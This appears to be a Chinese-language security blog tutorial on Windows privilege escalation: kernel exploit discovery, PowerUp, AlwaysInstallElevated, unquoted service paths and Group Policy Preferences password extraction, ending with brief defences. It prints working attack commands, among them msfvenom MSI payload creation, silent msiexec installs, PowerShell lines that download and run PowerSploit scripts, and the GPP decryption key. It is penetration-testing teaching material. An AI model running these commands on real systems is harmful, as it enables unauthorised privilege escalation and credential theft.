**前言：
**[“​欲落的樱花可能永远等不到富士山的日落”](https://www.juzikong.com/posts/f90d6504-e417-437d-9e00-95e7c3e2606d)****

## 一、基础知识

在windows中，权限大概分为四种，分别是 **User** 、 **Administrator** 、 **System** 、
**TrustedInstallerTrus**

1. **user** ：普通用户权限，是系统中最安全的权限（因为分配给改组的默认权限不允许成员操作修改操作系统的设置或用户资料）

2. **Administrator** ： 管理员权限。可以利用windows的机制将自己提升为system权限，以便操作SAm文件

3. **System** ： 系统权限。可以对sam等敏感文件进行读取，往往需要将administrator权限提升到system权限才可以对散列值进行DUmp操作

4. **TrustedInstaller** ：window中的最高权限，对系统文件，即将拥有system权限也无法进行获取散列值、安装软件、修改防火墙规则、修改注册表等

 **纵向提权** ： 低权限角色获得高权限角色的权限，例如，一个webshell权限通过提权，拥有了管理员权限，这种提权就是纵向提权。

 **横向提权** ： 获取同级别角色的权限。

##  **二、系统内核溢出漏洞提权分析及防范**

溢出漏洞就像往杯子里面装水-- 如果水太多，杯子装不下了，就会溢出来。

系统内核溢出漏洞提权是一种通用的提权方法，攻击者通常可以使用该方法绕过系统的所有安全限制。攻击者利用该漏洞的关键是目标系统没用及时补丁。

###  **1\. 通过手动执行命令发现缺失补丁**

1.whoami/groups

![1624070645_60cd59f59e5af28eae34c.png!small?1624070645214](https://image.3001.net/images/20210619/1624070645_60cd59f59e5af28eae34c.png!small?1624070645214)

###  **2.查看目标机器的补丁 systeminfo**

![1624070668_60cd5a0cf08a6f279bc4d.png!small?1624070668658](https://image.3001.net/images/20210619/1624070668_60cd5a0cf08a6f279bc4d.png!small?1624070668658)

###  **3.使用wmic 命令：wmic qfe get Caption,Description ,HotFixID,InstalledOn**

![1624070685_60cd5a1d769a65231e24c.png!small?1624070685024](https://image.3001.net/images/20210619/1624070685_60cd5a1d769a65231e24c.png!small?1624070685024)

 **实验1** ：

 **2 .利用Metasploit发现缺失补丁**

![1624071239_60cd5c472ea1268c791fc.png!small?1624071238810](https://image.3001.net/images/20210619/1624071239_60cd5c472ea1268c791fc.png!small?1624071238810)

![1624071249_60cd5c51182041a87bfbd.png!small?1624071248715](https://image.3001.net/images/20210619/1624071249_60cd5c51182041a87bfbd.png!small?1624071248715)

 **3\. windows exploit suggseter**

> 可以将已经安装的补丁和微软的漏洞数据库进行比较
>
> 并且可以帮助识别出能导致权限提升的漏洞

下载地址:<https://github.com/AonCyberLabs/Windows-Exploit-Suggester>

![1624071272_60cd5c683476e58751053.png!small?1624071272162](https://image.3001.net/images/20210619/1624071272_60cd5c683476e58751053.png!small?1624071272162)

![1624071291_60cd5c7b6ff117e9b6262.png!small?1624071291099](https://image.3001.net/images/20210619/1624071291_60cd5c7b6ff117e9b6262.png!small?1624071291099)

![1624071308_60cd5c8c70ca302a7914a.png!small?1624071308236](https://image.3001.net/images/20210619/1624071308_60cd5c8c70ca302a7914a.png!small?1624071308236)

拿到session必做的2件事,可以快速识别系统可以利用的漏洞，比如提权～

    
    
    use post/windows/gather/enum_patches
    
    use post/multi/recon/local_exploit_suggester

 **4 PowerShell 的sherlock脚本**

![1624071896_60cd5ed844c6763d4d770.png!small?1624071895865](https://image.3001.net/images/20210619/1624071896_60cd5ed844c6763d4d770.png!small?1624071895865)

![1624071918_60cd5eee193329fda5ad6.png!small?1624071917892](https://image.3001.net/images/20210619/1624071918_60cd5eee193329fda5ad6.png!small?1624071917892)

##  **三、windows 操作系统配置错误利用分析及规范**

前言：在windows操作系统中，攻击者通常会通过系统内核溢出漏洞来提权，但如果碰到无法通关系统溢出漏洞提取所在服务器权限的情况，就会利用系统中的配置错误来提权。

> 管理员凭证配置错误
>
> 服务配置错误
>
> 故意削弱的安全措施
>
> 用户权限过高

 **系统服务权限配置错误**

windows系统服务文件在操作系统启动时加载执行，并在后台调用可执行文件。如果一个低权限的用户对此类系统服务调用的可执行文件拥有写权限，那么就可以替换该文件，并随着系统启动获得控制权限。

windows服务是以system权限运行的，其文件夹、文件和注册表key-value都是受强制访问控制保护的。但是在某些情况下，操作系统中依然存在一些没有得到有效保护的服务

系统服务权限配置错误（可写目录漏洞）有如下两种可能。

> 1.服务未运行：攻击者会使用任意服务来替换原来的服务，然后重启服务。
>
> 2.服务正在运行且无法被终止：这种情况符合绝大多数的漏洞利用情景，攻击者通常会利用DLL劫持技术并尝试重启服务来提权。

###  **1.PowerUP下的实战利用**

下载地址：<https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1>

![1624071967_60cd5f1f96e1f00719a5a.png!small?1624071967247](https://image.3001.net/images/20210619/1624071967_60cd5f1f96e1f00719a5a.png!small?1624071967247)

    
    
    powershell.exe -exec bypass -Command "& {import-Module .\Powerup.ps1; Invoke-AllChecks}"

![1624072001_60cd5f41e575acff9a00d.png!small?1624072001588](https://image.3001.net/images/20210619/1624072001_60cd5f41e575acff9a00d.png!small?1624072001588)

    
    
    Powershell.exe -nop -exec bypass "IEX(New-Object Net.WebClient).DownloadString('C:\PowerUp.ps1'); Invoke-AllChecks"

![1624072016_60cd5f503748b02effa73.png!small?1624072015765](https://image.3001.net/images/20210619/1624072016_60cd5f503748b02effa73.png!small?1624072015765)

![1624072027_60cd5f5baa0eb4746fa8a.png!small?1624072027227](https://image.3001.net/images/20210619/1624072027_60cd5f5baa0eb4746fa8a.png!small?1624072027227)

###  **2.Metasploit下的实战利用**

![1624072042_60cd5f6a3a152ebb2ec70.png!small?1624072041936](https://image.3001.net/images/20210619/1624072042_60cd5f6a3a152ebb2ec70.png!small?1624072041936)

![1624072051_60cd5f7313fd1b808fdfc.png!small?1624072050860](https://image.3001.net/images/20210619/1624072051_60cd5f7313fd1b808fdfc.png!small?1624072050860)

 **2 注册表键 ALwaysINstallElevated**

允许低权限用户以System权限安装文件。如果启用此策略设置项，那么任何权限的用户都以NT Authority\System权限来安装恶意的MSI文件。

windows
install是windows操作系统的组件之一，专门用来管理配置软件服务。它除了是一个安装程序，还用于管理软件的安装、组件的添加、删除、监视文件的还原、通过回滚进行灾难恢复。windows
install通过msiexec.exe安装MSI文件，双击MSI文件就会运行msiexec.exe。

在运行中输入`gpedit.msc`，然后以管理员方式打开：

> 配置「计算机配置」
>
> 配置「用户配置」

WIndows INstaller的相关知识点

![1624072064_60cd5f80547beb9e2b8af.png!small?1624072063957](https://image.3001.net/images/20210619/1624072064_60cd5f80547beb9e2b8af.png!small?1624072063957)

![1624072075_60cd5f8b29d801a278565.png!small?1624072074828](https://image.3001.net/images/20210619/1624072075_60cd5f8b29d801a278565.png!small?1624072074828)

通过命令查询是否开启

    
    
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    
    
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

开启返回：

    
    
    HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    
    
    AlwaysInstallElevated REG_DWORD 0x1
    
    
    HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    
    
    AlwaysInstallElevated REG_DWORD 0x1

未开启就会返回`系统找不到指定的注册表项或值`

如果系统开启了AlwaysInstallElevated，可以使用msfvenom创建恶意msi文件，然后使用`msiexec`进行开火

    
    
    msfvenom -f msi -p windows/adduser USER=msi PASS=Yoga123!@ -o /root/msi.msi
    
    
    msiexec /quiet /qn /i d:\msi.msi
    
    
    # /quiet 安装过程中禁止向用户发送消息
    
    
    # /qn 不使用GUI
    
    
    # /i 安装程序

或者直接使用`exploit/windows/local/always_install_elevated`模块提至System权限

![1624072089_60cd5f994ecf02b2b2cd0.png!small?1624072089003](https://image.3001.net/images/20210619/1624072089_60cd5f994ecf02b2b2cd0.png!small?1624072089003)

#### 计划任务

适用系统版本：

> windows2000
>
> windows2003
>
> windows XP

at
是一个发布定时任务计划的命令行工具，语法比较简单。通过at命令发布的定时任务计划，Windows默认以System权限运行。定时任务可以是批处理，也可以是一个二进制文件

语法：`at 11:00PM calc.exe`，`/interactive`可以开启界面交互模式

利用`Regsvr32+exploit/multi/script/web_delivery`模块

![1624072099_60cd5fa3d10e1034bd9b1.png!small?1624072099555](https://image.3001.net/images/20210619/1624072099_60cd5fa3d10e1034bd9b1.png!small?1624072099555)

###  **3.PowrUp下的实战利用**

1.powershell -nop -exec bypass IEX(New-Object

    
    
    Net.WebClient).DownloadString('C:\Users\testuser\Desktop\Sherlock-master\PowerUp.ps1');Get-RegistryAlwaysInstallElevated
    
    
    Get-RegistryAlwaysInstallElevated
    Write-UserAddMSI

![1624072111_60cd5faf0a9fd4d1884e9.png!small?1624072111009](https://image.3001.net/images/20210619/1624072111_60cd5faf0a9fd4d1884e9.png!small?1624072111009)

    
    
    msiexec.exe /q /i UserAdd.msi

![1624072125_60cd5fbd16249e83cc3d7.png!small?1624072124734](https://image.3001.net/images/20210619/1624072125_60cd5fbd16249e83cc3d7.png!small?1624072124734)

## 四、 可信任服务路径漏洞

利用了windows文件路径解析的特性，如果一个服务调用的可执行文件没有正确处理所引用的完整路径名，这个漏洞就会被攻击者用来上传任意可执行文件。

通俗的说，如果一个服务的可执行文件的路径（带空格）没有被双引号引起来，那么这个服务就有漏洞。

一个例子，编译之后存放在为`C:\Program Files\Test\test.exe`

    
    
    #include <stdio.h>
    int main(int argc, char *argv[])
    {
    printf("[*] Executed %s\n", argv[0]);
    }

从命令行直接通过其绝对路径执行该程序：

    
    
    $ "C:\Program Files\Test\test.exe"
    [*] Executed C:\Program Files\Test\test.exe
    $ C:\Program Files\Test\test.exe
    'C:\Program' 不是内部或外部命令，也不是可运行的程序
    或批处理文件。
    #将test改为Program.exe之后并放入C盘下 
    $ C:\Program Files\Test\test.exe
    [*] Executed C:\Program

对于上面的空格，Windows都会尝试寻找并执行名字与空格前的名字相匹配的程序，所以不加引号的时候就会报错。此时，假如能上传一个适当命名的后门程序，那么当服务重启的时候就会以system权限运行（大多数情况下）

所以，理论上一个服务的可执行文件的路径没有用双引号封闭，且包含空格，那么就是存在漏洞的

### 检测是否存在漏洞

    
    
    wmic service get name,displayname,pathname,startmode|findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr/i /v """

### 检查对有漏洞的目录是否具有写入权限

    
    
    icacls "C:\Program Files"

### 使用`trusted_service_path`模块

 **Trusted Service Paths漏洞产生的原因**

windows服务通常都是以System权限运行的，所以系统在解析服务的二进制文件对应的文件路径中的空格的时候也会以系统权限进行解析。如果我们能利用这一特性，就有机会进行权限提升。

比如：C:\Program Files\Some Folder\Service.exe

C:\Program.exe

C:\Program Files\Some.exe

C:\Program Files\Some Folder\Service.exe

所以如果我们能够上传一个适当命名的恶意可执行程序在受影响的目录，服务一旦重启，我们的恶意程序就会以system权限运行(大多数情况下)。

 **1.Metasploit下的实战利用**

1.先检测目标主机是否存在该漏洞。理论上讲，如果一个服务的可执行文件的路径没有用双引号封闭，并且包含空格，那么这个服务就是有漏洞的。
我们在meterpreter
shell命令提示符下输入shell命令进入目标机cmd下，然后使用下列wmi查询命令来列举受害者机器上所有的没有加引号的服务路径(除去了windows本身的服务)。

    
    
    wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

可以看到，有“Vulnerable
Service”、“OmniServ”、“OmniServer”、“OmniServers”四个服务对应的二进制文件路径没有引号包含起来，并且路径中包含空格。是存在该漏洞的，但在上传可执行文件进去之前，我们需要确定我们对目标文件夹是否有写入的权限。

 **2.检查对有漏洞目录是否有写入的权限** ，这个很关键。这里我们使用Windows内建的一个工具，icacls，下面我们用这个工具依次来检查

“C:\Program Files”

“C:\Program Files\Common Files”

“C:\Program Files\Common Files\microsoft shared”

![1624072448_60cd61002fc3ce374ff8c.png!small?1624072447999](https://image.3001.net/images/20210619/1624072448_60cd61002fc3ce374ff8c.png!small?1624072447999)

“Everyone”用户对这个文件有完全控制权，就是说所有用户都具有全部权限修改这个文件夹。
参数说明：“M”表示修改，“F”代表完全控制，“CI”代表从属容器将继承访问控制项，“OI”代表从属文件将继承访问控制项。这意味着对该目录有读，写，删除其下的文件，删除该目录下的子目录的权限。

 **3.我们确认了目标主机存在此漏洞后，将便开始正式攻击** ，Metasploit中相对应的是Windows Service Trusted Path
Privilege
Escalation本地利用模块，该模块会将恶意的可执行程序放到受影响的文件夹中去，然后将受影响的服务重启。接着我们输入命令background,把当前的meterpreter
shell转为后台执行。然后在Metasploit中搜索trusted_service_path模块

![1624072462_60cd610e5c3540c90d923.png!small?1624072461934](https://image.3001.net/images/20210619/1624072462_60cd610e5c3540c90d923.png!small?1624072461934)

 **4 自动安装配置文件**

网络管理员在内网中给多台机器配置同一个环境时，通常不会逐台配置，而会使用脚本化批量部署的方法。在这一过程中，会使用安装配置条件。

C:\sysprep.ing

C:sysC:sysprp.xml

C:\\\windows\system32\sysrep.inf

![1624072473_60cd611993e1e3fc06123.png!small?1624072473302](https://image.3001.net/images/20210619/1624072473_60cd611993e1e3fc06123.png!small?1624072473302)

可以在metasploit中利用这个漏洞：

**![1624072482_60cd612206ba9d5b215c1.png!small?1624072481662](https://image.3001.net/images/20210619/1624072482_60cd612206ba9d5b215c1.png!small?1624072481662)**

 **5\. 计划任务**

AccessChk用于在windows中进行一些高级查询、管理和故障排除工作。由于它是微软官方提供的工具，所以杀毒软件不会有告警。如果黑客对以高权限运行的任务，所在的目录具有写权限，那么就可以使用恶意程序覆盖原有的程序。这样，在计划任务下次执行的时候，就会以高权限运行恶意程序。

通过AccessChk查看指定目录的权限配置情况：

    
    
    accesschk64.exe -dqv "C:\Microsoft" -accepteula

 **6 Empire 内置模块**

Empire内置了PowerUp的部分模快。输入"usermodule prives/powerup"

##  **五、 组策略首选项提权分析及防范**

sysvol是活动目录里面的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控制器之间进行复制。sysvol文件夹是在安装活动目录时自动创建的，主要用来存放登陆脚本、组策略数据、其他域控制器需要的域信息。

sysvol在所有经过身份验证的域用户、域信任用户具有读权限的活动目录的域范围内共享，整个sysvol目录在所有的域控制器中是自动同步和共享的，所有的域策略都存放在sysvol下。为方便对所有机器进行操作，网络管理员会使用域策略进行统一的配置和管理，那么所有机器的本地管理员密码就是一样的，黑客就是利用这一点。

![1624072498_60cd6132bab4d0211c035.png!small?1624072498446](https://image.3001.net/images/20210619/1624072498_60cd6132bab4d0211c035.png!small?1624072498446)

###  **1.常见的组策略首选项：**

> 映射驱动器
>
> 创建本地用户
>
> 数据源
>
> 打印机配置
>
> 创建/更新服务
>
> 计划任务

###  **2 组策略首选项提取分析**

1.创建组策略，批量修改域中机器的本地管理员密码

![1624072508_60cd613c9d7b6e9c97812.png!small?1624072508306](https://image.3001.net/images/20210619/1624072508_60cd613c9d7b6e9c97812.png!small?1624072508306)

进入「计算机配置」下的「首选项」，就可以更新一个用户啦。

![1624072519_60cd61472ed60d06781a2.png!small?1624072518799](https://image.3001.net/images/20210619/1624072519_60cd61472ed60d06781a2.png!small?1624072518799)

计算机配置中的账户策略，也只是设置密码的复杂度、长度、过期时间等～

**![1624072530_60cd615299e85ed9b1e1f.png!small?1624072530225](https://image.3001.net/images/20210619/1624072530_60cd615299e85ed9b1e1f.png!small?1624072530225)**

###  **3.获取组策略的凭据**

 **1.手动查找**

 **浏览** SysVQL文件夹，获取相关文件

![1624072541_60cd615db07a82fa402d8.png!small?1624072541301](https://image.3001.net/images/20210619/1624072541_60cd615db07a82fa402d8.png!small?1624072541301)

也可以使用type命令搜索。

 **2.使用powershell获取cpassword**

**下载地址：**<https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1>

操作过程：

1.首先打开Windows资源管理器，并搜索域名为SYSVOL
DFS共享的XML文件。在大多数情况下，以下XML文件将包含凭据：groups.xml，scheduledtasks.xml和＆Services.xml，Printers.xml
，Drives.xml.

SYSVOL是所有经过身份验证的用户具有读访问权限的Active Directory中的域范围共享

SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。
Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。

SYSVOL包含登录脚本，组策略数据以及需要在任何有域控制器的任何地方可用的其他域范围数据（因为SYSVOL在所有域控制器之间自动同步并共享）。

所有域组策略都存储在这里：\\\ <DOMAIN> \ SYSVOL \ <DOMAIN> \ Policies \

注意：C:\Windows\SYSVOL目录下，只有创建组策略脚本登录才能有策略脚本配置文件groups.xml,默认是没有的

当创建新的GPP时，在SYSVOL中创建了一个与相关配置数据相关联的XML文件，如果提供了密码，那么AES-256位加密应该足够强的。

用于加密任何域中的所有组策略首选项密码的32字节AES密钥：

4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8

f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b

![1624072555_60cd616b466626672e45e.png!small?1624072554841](https://image.3001.net/images/20210619/1624072555_60cd616b466626672e45e.png!small?1624072554841)

命令：

> 1.powershell "IEX (New-Object
> Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-> GPPPas  
> sword.ps1');Get-GPPPassword"
>
> 2.powershell import-modulo .\Get-GPPpassword.ps1;Get-GppPassword

 **3.使用Metasploit获取cpassword**

![1624072566_60cd6176e758c559a788a.png!small?1624072566602](https://image.3001.net/images/20210619/1624072566_60cd6176e758c559a788a.png!small?1624072566602)

 **4.使用Empire查找cpassword**

命令：usemodule privesc/gpp

 **实验:gpp组策略搭建**

让我们看一个例子，说明通过组策略定义本地用户登录。它从创建和编辑组策略对象开始：

![1624072595_60cd6193d53c534fd87cc.png!small?1624072595601](https://image.3001.net/images/20210619/1624072595_60cd6193d53c534fd87cc.png!small?1624072595601)

在域组织中的组策略对象中创建一个登录账号脚本策略：名称为：

gpp_local_login:

![1624072592_60cd6190749f17f78853f.png!small?1624072595578](https://image.3001.net/images/20210619/1624072592_60cd6190749f17f78853f.png!small?1624072595578)

![1624072604_60cd619ce59f2c08ede6d.png!small?1624072604605](https://image.3001.net/images/20210619/1624072604_60cd619ce59f2c08ede6d.png!small?1624072604605)

选择新建的组策略gpp_local_login然后编辑：

![1624072615_60cd61a7a0c4383610b78.png!small?1624072615234](https://image.3001.net/images/20210619/1624072615_60cd61a7a0c4383610b78.png!small?1624072615234)

![1624072628_60cd61b4d7e7a6bbc51e6.png!small?1624072628462](https://image.3001.net/images/20210619/1624072628_60cd61b4d7e7a6bbc51e6.png!small?1624072628462)

用户配置---控制面板设置---本地用户和组--新建-本地用户中添加一个脚本登录。

![1624072651_60cd61cb61ca12c2679eb.png!small?1624072651184](https://image.3001.net/images/20210619/1624072651_60cd61cb61ca12c2679eb.png!small?1624072651184)

  

![1624072661_60cd61d51b52c2b9c0dea.png!small?1624072660753](https://image.3001.net/images/20210619/1624072661_60cd61d51b52c2b9c0dea.png!small?1624072660753)

可以看到域控制器行创建了本地组策略的文件：

![1624072378_60cd60ba774de4eddab84.png!small?1624072378353](https://image.3001.net/images/20210619/1624072378_60cd60ba774de4eddab84.png!small?1624072378353)

通过网络共享可以访问到GPP的组策略的文件：

>
> \\\bk.com\SYSVOL\bk.com\Policies\\{CE710A28-3FB8-4365-B356-41A30B5E9014}\User\Preferences\Groups\gpoups.xml

![1624072360_60cd60a864753383bd373.png!small?1624072359941](https://image.3001.net/images/20210619/1624072360_60cd60a864753383bd373.png!small?1624072359941)

打开可以看到存储的cpasword密码：

![1624072340_60cd6094b1582d3fc88ca.png!small?1624072340479](https://image.3001.net/images/20210619/1624072340_60cd6094b1582d3fc88ca.png!small?1624072340479)

##  **六、 针对组策略首选项提取的防御措施**

1.设置共享文件夹SYSVOL的访问权限

2.将包含组策略密码的XMl文件从SYSVOl目录中删除

3.不要把密码放在所有域用户都有权访问的文件中

4.如果需要更改域中机器的本地管理员密码，建议使用LAPs

## 总结：

本文主要从内网权限提升出发，主要介绍一些低权限用户如何通过一些工具和脚本来获取一些高权限。中间介绍了一些脚本和工具的使用，还做了几个实验来理解这些工具。

